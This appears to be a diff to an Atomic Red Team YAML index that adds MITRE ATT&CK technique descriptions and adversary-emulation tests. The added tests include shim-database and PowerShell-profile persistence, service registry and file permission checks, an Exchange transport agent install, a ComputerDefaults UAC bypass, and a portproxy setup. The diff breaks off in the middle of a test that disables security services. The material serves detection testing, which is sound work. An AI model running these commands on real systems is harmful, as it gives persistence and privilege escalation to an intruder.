@@ -717,13 +717,43 @@ persistence:
         file_path:
           description: Path to the shim databaase file
           type: String
-          default: C:\AtomicRedTeam\atomics\T1138\src\AtomicShimx86.sdb
+          default: PathToAtomicsFolder\T1138\src\AtomicShimx86.sdb
       executor:
         name: command_prompt
         elevation_required: true
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1197:
     technique:
       x_mitre_data_sources:
@@ -1470,6 +1500,92 @@ persistence:
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           cmd.exe /k %APPDATA%\updater.exe
+  T1044:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      - User
+      x_mitre_data_sources:
+      - File monitoring
+      - Services
+      - Process command-line parameters
+      name: File System Permissions Weakness
+      description: |-
+        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
+
+        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+        ### Services
+
+        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.
+
+        ### Executable Installers
+
+        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)
+      id: attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.
+
+        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:43.063Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      - Administrator
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1044
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1044
+      - source_name: capec
+        external_id: CAPEC-17
+        url: https://capec.mitre.org/data/definitions/17.html
+      - source_name: Mozilla Firefox Installer DLL Hijack
+        description: Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory
+          2012-98. Retrieved March 10, 2017.
+        url: https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/
+      - source_name: Seclists Kanthak 7zip Installer
+        description: "Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL
+          (case 7): 7z*.exe\tallows remote code execution with escalation of privilege.
+          Retrieved March 10, 2017."
+        url: http://seclists.org/fulldisclosure/2015/Dec/34
+      modified: '2019-07-17T21:22:37.100Z'
+      identifier: T1044
+    atomic_tests:
+    - name: File System Permissions Weakness
+      description: "This test to show checking file system permissions weakness and
+        which can lead to privilege escalation by replacing malicious file. Example;
+        check weak file permission and then replace.\npowershell -c \"Get-WmiObject
+        win32_service | select PathName\"   (check service file location) and \ncopy
+        /Y C:\\temp\\payload.exe C:\\ProgramData\\folder\\Update\\weakpermissionfile.exe
+        \  ( replace weak permission file with malicious file )\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_permission_file:
+          description: check weak files permission
+          type: path
+          default: GoogleUpdate.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Get-WmiObject win32_service | select PathName
+          get-acl "C:\Program Files (x86)\Google\Update\#{weak_permission_file}" | FL | findstr "FullControl"
   T1158:
     technique:
       x_mitre_data_sources:
@@ -2862,7 +2978,7 @@ persistence:
         command: |
           sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1031 Test'\""
           sc start Fax
-          sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe"
+        cleanup_command: sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe"
   T1128:
     technique:
       x_mitre_data_sources:
@@ -3017,7 +3133,7 @@ persistence:
         binary_path:
           description: Name of the service binary, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1050\bin\AtomicService.exe
+          default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
         service_name:
           description: Name of the Service
           type: String
@@ -3028,6 +3144,7 @@ persistence:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -3040,7 +3157,7 @@ persistence:
         binary_path:
           description: Name of the service binary, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1050\bin\AtomicService.exe
+          default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
         service_name:
           description: Name of the Service
           type: String
@@ -3051,6 +3168,7 @@ persistence:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1137:
@@ -3343,6 +3461,111 @@ persistence:
               ~/Library/Preferences
 
           2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
+  T1504:
+    technique:
+      x_mitre_data_sources:
+      - Process monitoring
+      - File monitoring
+      - PowerShell logs
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      name: PowerShell Profile
+      description: "Adversaries may gain persistence and elevate privileges in certain
+        situations by abusing [PowerShell](https://attack.mitre.org/techniques/T1086)
+        profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that
+        runs when PowerShell starts and can be used as a logon script to customize
+        user environments. PowerShell supports several profiles depending on the user
+        or host program. For example, there can be different profiles for PowerShell
+        host programs such as the PowerShell console, PowerShell ISE or Visual Studio
+        Code. An administrator can also configure a profile that applies to all users
+        and host programs on the local computer. (Citation: Microsoft About Profiles)
+        \n\nAdversaries may modify these profiles to include arbitrary commands, functions,
+        modules, and/or PowerShell drives to gain persistence. Every time a user opens
+        a PowerShell session the modified script will be executed unless the <code>-NoProfile</code>
+        flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)
+        \n\nAn adversary may also be able to escalate privileges if a script in a
+        PowerShell profile is loaded and executed by an account with higher privileges,
+        such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)"
+      id: attack-pattern--723e3a2b-ca0d-4daa-ada8-82ea35d3733a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet) Example profile locations include:
+
+        * <code>$PsHome\Profile.ps1</code>
+        * <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
+        * <code>$Home\My Documents\PowerShell\Profile.ps1</code>
+        * <code>$Home\My Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code>
+
+        Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Allen DeRyke, ICE
+      created: '2019-06-14T18:53:49.472Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1504
+        url: https://attack.mitre.org/techniques/T1504
+      - description: Microsoft. (2017, November 29). About Profiles. Retrieved June
+          14, 2019.
+        source_name: Microsoft About Profiles
+        url: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6
+      - description: Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell
+          usage. Retrieved June 14, 2019.
+        source_name: ESET Turla PowerShell May 2019
+        url: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      - description: 'DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege
+          Elevation using the Powershell Profile. Retrieved July 8, 2019.'
+        source_name: Wits End and Shady PowerShell Profiles
+        url: https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html
+      - source_name: Malware Archaeology PowerShell Cheat Sheet
+        description: Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING
+          CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.
+        url: http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf
+      modified: '2019-07-19T14:46:24.213Z'
+      identifier: T1504
+    atomic_tests:
+    - name: Append malicious start-process cmdlet
+      description: 'Appends a start process cmdlet to the current user''s powershell
+        profile pofile that points to a malicious executable
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_path:
+          description: Path the malicious executable
+          type: Path
+          default: calc.exe
+        ps_profile:
+          description: Powershell profile to use
+          type: String
+          default: "$profile"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          if(Test-Path #{ps_profile}){
+          }
+          else{
+            New-Item -Path #{ps_profile} -Type File -Force
+          }
+          $malicious = "Start-Process #{exe_path}"
+          Add-Content #{ps_profile} -Value $malicious
+          powershell -command exit
+        cleanup_command: |-
+          $oldprofile = cat $profile | Select-Object -skiplast 1
+          Set-Content $profile -Value $oldprofile
   T1163:
     technique:
       x_mitre_permissions_required:
@@ -3935,6 +4158,207 @@ persistence:
 
           # revert (before reboot)
           Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages
+  T1505:
+    technique:
+      x_mitre_data_sources:
+      - File monitoring
+      - Application logs
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      - root
+      name: Server Software Component
+      description: |-
+        Adversaries may abuse legitimate extensible development features of server applications to establish persistent access to systems. Enterprise server applications may include features that allow application developers to write and install software to extend the functionality of the main application. Adversaries may install malicious software components to maliciously extend and abuse server applications.
+
+        ###Transport Agent
+        Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.
+
+        Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.
+
+        ###SQL Stored Procedures
+        SQL stored procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as <code>xp_cmdshell</code> for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017)
+
+        Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures, these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)
+      id: attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb
+      x_mitre_platforms:
+      - Windows
+      - Linux
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'Consider monitoring application logs for abnormal behavior
+        that may indicate suspicious installation of application software components.
+        Consider monitoring file locations associated with the installation of new
+        application software components such as paths from which applications typically
+        load such extensible components. On MSSQL Server, consider monitoring for
+        <code>xp_cmdshell</code> usage.(Citation: NetSPI Startup Stored Procedures)'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Christoffer Strömblad
+      - Kaspersky
+      - Lucas da Silva Pereira, @vulcanunsec, CIP
+      - Carlos Borges, @huntingneo, CIP
+      - ESET
+      created: '2019-06-28T17:52:07.296Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      external_references:
+      - source_name: mitre-attack
+        external_id: T1505
+        url: https://attack.mitre.org/techniques/T1505
+      - description: Microsoft. (2016, June 1). Transport agents. Retrieved June 24,
+          2019.
+        source_name: Microsoft TransportAgent Jun 2016
+        url: https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
+      - description: 'Faou, M. (2019, May). Turla LightNeuron: One email away from
+          remote code execution. Retrieved June 24, 2019.'
+        source_name: ESET LightNeuron May 2019
+        url: https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf
+      - description: 'Sutherland, S. (2016, March 7). Maintaining Persistence via
+          SQL Server – Part 1: Startup Stored Procedures. Retrieved July 8, 2019.'
+        source_name: NetSPI Startup Stored Procedures
+        url: https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/
+      - description: 'Plakhov, A., Sitchikhin, D. (2019, August 22). Agent 1433: remote
+          attack on Microsoft SQL Server. Retrieved September 4, 2019.'
+        source_name: Kaspersky MSSQL Aug 2019
+        url: https://securelist.com/malicious-tasks-in-ms-sql-server/92167/
+      - description: Microsoft. (2017, March 15). xp_cmdshell (Transact-SQL). Retrieved
+          September 9, 2019.
+        source_name: Microsoft xp_cmdshell 2017
+        url: https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017
+      - description: Microsoft. (2017, June 19). Common Language Runtime Integration.
+          Retrieved July 8, 2019.
+        source_name: Microsoft CLR Integration 2017
+        url: https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017
+      - description: Sutherland, S. (2017, July 13). Attacking SQL Server CLR Assemblies.
+          Retrieved July 8, 2019.
+        source_name: NetSPI SQL Server CLR
+        url: https://blog.netspi.com/attacking-sql-server-clr-assemblies/
+      modified: '2019-09-27T19:01:29.543Z'
+      identifier: T1505
+    atomic_tests:
+    - name: Install MS Exchange Transport Agent Persistence
+      description: |
+        Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.
+        More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
+      supported_platforms:
+      - windows
+      input_arguments:
+        transport_agent_identity:
+          description: Friendly name of transport agent once installed.
+          type: string
+          default: Security Interop Agent
+        dll_path:
+          description: Path of DLL to use as transport agent.
+          type: path
+          default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
+        class_factory:
+          description: Class factory of transport agent.
+          type: string
+          default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
+      executor:
+        name: powershell
+        elevation_required: true
+        prereq_command: |
+          Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+          Get-TransportAgent -TransportService FrontEnd
+        command: |
+          Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
+          Enable-TransportAgent #{transport_agent_identity}
+          Get-TransportAgent | Format-List Name,Enabled
+        cleanup_command: |
+          Disable-TransportAgent #{transport_agent_identity}
+          Uninstall-TransportAgent #{transport_agent_identity}
+          Get-TransportAgent
+  T1058:
+    technique:
+      x_mitre_data_sources:
+      - Process command-line parameters
+      - Services
+      - Windows Registry
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      name: Service Registry Permissions Weakness
+      description: |-
+        Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)
+
+        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).
+
+        Adversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)
+      id: attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      x_mitre_system_requirements:
+      - Ability to modify service values in the Registry
+      type: attack-pattern
+      x_mitre_detection: |-
+        Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: TechNet Autoruns) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.
+
+        Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Matthew Demaske, Adaptforward
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:49.119Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1058
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1058
+      - source_name: capec
+        external_id: CAPEC-478
+        url: https://capec.mitre.org/data/definitions/478.html
+      - source_name: MSDN Registry Key Security
+        description: Microsoft. (n.d.). Registry Key Security and Access Rights. Retrieved
+          March 16, 2017.
+        url: https://msdn.microsoft.com/library/windows/desktop/ms724878.aspx
+      - description: 'Hull, D. (2014, May 3). Kansa: Service related collectors and
+          analysis. Retrieved October 10, 2019.'
+        source_name: TrustedSignal Service Failure
+        url: https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html
+      - source_name: Twitter Service Recovery Nov 2017
+        description: The Cyber (@r0wdy_). (2017, November 30). Service Recovery Parameters.
+          Retrieved April 9, 2018.
+        url: https://twitter.com/r0wdy_/status/936365549553991680
+      - source_name: TechNet Autoruns
+        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
+          Retrieved June 6, 2016.
+        url: https://technet.microsoft.com/en-us/sysinternals/bb963902
+      modified: '2019-10-11T02:52:39.175Z'
+      identifier: T1058
+    atomic_tests:
+    - name: Service Registry Permissions Weakness
+      description: "Service registry permissions weakness check and then which can
+        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
+        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service check
+          type: Registry
+          default: weakservicename
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
+          get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
   T1166:
     technique:
       x_mitre_data_sources:
@@ -4046,6 +4470,73 @@ persistence:
         command: |
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
+  T1023:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      name: Shortcut Modification
+      description: Shortcuts or symbolic links are ways of referencing other files
+        or programs that will be opened or executed when the shortcut is clicked or
+        executed by a system startup process. Adversaries could use shortcuts to execute
+        their tools for persistence. They may create a new shortcut as a means of
+        indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036)
+        to look like a legitimate program. Adversaries could also edit the target
+        path or entirely replace an existing shortcut so their tools will be executed
+        instead of the intended legitimate program.
+      id: attack-pattern--970cdb5c-02fb-4c38-b17e-d6327cf3c810
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: Since a shortcut's target path likely will not change, modifications
+        to shortcut files that do not correlate with known software changes, patches,
+        removal, etc., may be suspicious. Analysis should attempt to relate shortcut
+        file change or creation events to other potentially suspicious events based
+        on known adversary behavior such as process launches of unknown executables
+        that make network connections.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:30.757Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      external_references:
+      - external_id: T1023
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1023
+      - source_name: capec
+        external_id: CAPEC-132
+        url: https://capec.mitre.org/data/definitions/132.html
+      modified: '2019-07-18T19:28:08.364Z'
+      identifier: T1023
+    atomic_tests:
+    - name: Shortcut Modification
+      description: "This test to simulate shortcut modification and then execute.
+        example shortcut (*.lnk , .url) strings check with powershell;  \ngci -path
+        \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String
+        -Pattern \"exe\" | FL \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        shortcut_file_path:
+          description: shortcut modified and execute
+          type: path
+          default: shortcutname.url
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe
+          >> #{shortcut_file_path} && #{shortcut_file_path}
+
+'
   T1165:
     technique:
       x_mitre_permissions_required:
@@ -4439,7 +4930,7 @@ persistence:
         web_shells:
           description: Path of Web Shell
           type: path
-          default: C:\AtomicRedTeam\atomics\T1100\shells\
+          default: PathToAtomicsFolder\T1100\shells\
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
@@ -5281,6 +5772,31 @@ defense-evasion:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\fodhelper.exe"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC using ComputerDefaults - PowerShell
+      description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe
+        on Windows 10
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
   T1191:
     technique:
       x_mitre_data_sources:
@@ -5588,7 +6104,7 @@ defense-evasion:
         local_chm_file:
           description: Local .chm payload
           type: path
-          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+          default: PathToAtomicsFolder\T1223\src\T1223.chm
       executor:
         name: command_prompt
         elevation_required: false
@@ -5776,9 +6292,39 @@ defense-evasion:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1196:
     technique:
       x_mitre_permissions_required:
@@ -6394,8 +6940,29 @@ defense-evasion:
           -Recurse
 
 '
-        cleanup_command: New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+        cleanup_command: 'New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
           -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
+
+'
+    - name: Disable Arbitrary Security Windows Service
+      description: "With administrative rights, an adversary can disable Windows Services
+        related to security products. \n"
+      supported_platforms:
